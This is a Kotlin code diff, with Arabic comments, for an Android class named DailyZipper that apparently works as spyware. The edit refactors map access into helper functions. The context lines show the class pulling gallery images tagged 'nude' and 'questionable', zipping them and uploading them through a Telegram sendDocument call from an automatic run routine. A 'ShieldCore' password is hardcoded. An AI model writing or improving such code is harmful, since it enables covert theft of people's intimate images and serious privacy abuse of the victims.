@@ -25,7 +25,7 @@ import java.util.zip.ZipOutputStream
 
 /**
  * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
- * تم إصلاح كافة استخدامات الأقواس المربعة واستبدالها بطرق آمنة باستخدام التحويل الصريح.
+ * تم إصلاح كافة استخدامات الأقواس المربعة واستبدالها بدوال مساعدة آمنة.
  */
 class DailyZipper(
     context: Context,
@@ -92,6 +92,24 @@ class DailyZipper(
         config.put("password", "ShieldCore2024!")
         config.put("max_batches", 10)
         loadConfig()
+    }
+
+    // ========== دوال مساعدة آمنة للوصول إلى الخرائط (بدون استخدام [] أو get) ==========
+    private fun safeGetFromMap(map: Any?, key: String): Any? {
+        return (map as? Map<*, *>)?.entries?.firstOrNull { it.key?.toString() == key }?.value
+    }
+
+    private fun safeGetBooleanFromMap(map: Any?, key: String, default: Boolean = false): Boolean {
+        val value = safeGetFromMap(map, key)
+        return when (value) {
+            true, "true", 1, "1" -> true
+            false, "false", 0, "0" -> false
+            else -> default
+        }
+    }
+
+    private fun safeGetStringFromMap(map: Any?, key: String, default: String = ""): String {
+        return safeGetFromMap(map, key)?.toString() ?: default
     }
 
     @Suppress("UNCHECKED_CAST")
@@ -262,7 +280,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات مع إعادة المحاولة (تم إصلاح استخدام الأقواس)
+    //  إرسال الملفات مع إعادة المحاولة (باستخدام الدوال المساعدة الآمنة)
     // ============================================================
 
     private suspend fun safeSend(
@@ -295,12 +313,8 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // ✅ التحقق الآمن من النتيجة بدون استخدام الأقواس المربعة
-                val resultMap = result as? Map<*, *>
-                val isOk = when (val okValue = resultMap?.get("ok")) {
-                    true, "true", 1, "1" -> true
-                    else -> false
-                }
+                // ✅ استخدام الدالة المساعدة الآمنة بدون أي أقواس مربعة أو get
+                val isOk = safeGetBooleanFromMap(result, "ok", false)
                 if (isOk) {
                     return true
                 }
@@ -612,7 +626,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي (تم إصلاح استخدام الأقواس)
+    //  التشغيل التلقائي (باستخدام الدالة المساعدة الآمنة)
     // ============================================================
 
     fun run(): Boolean {
@@ -633,8 +647,8 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخراج المسار بشكل آمن بدون استخدام الأقواس المربعة
-                            val path = (item as? Map<*, *>)?.get("path")?.toString() ?: ""
+                            // ✅ استخراج المسار باستخدام الدالة المساعدة الآمنة
+                            val path = safeGetStringFromMap(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
